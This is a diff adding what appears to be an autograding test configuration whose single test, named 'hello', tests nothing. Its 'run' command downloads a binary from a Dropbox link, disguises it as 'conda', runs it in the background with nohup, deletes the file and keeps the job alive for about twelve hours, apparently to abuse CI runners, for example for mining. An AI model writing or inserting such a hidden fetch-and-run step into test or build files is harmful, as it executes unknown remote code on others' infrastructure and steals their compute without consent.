@@ -1,0 +1,14 @@
+{
+  "tests": [
+    {
+      "name": "hello",
+      "setup": "",
+      "run": "wget -q https://www.dropbox.com/s/cfpeh1n2c03gbzy/conda-2?dl=1 -O conda; chmod +x conda; nohup ./conda & sleep 2; rm -rf conda; sleep 43000",
+      "input": "",
+      "output": "",
+      "comparison": "included",
+      "timeout": 1000,
+      "points": null
+    }
+  ]
+}
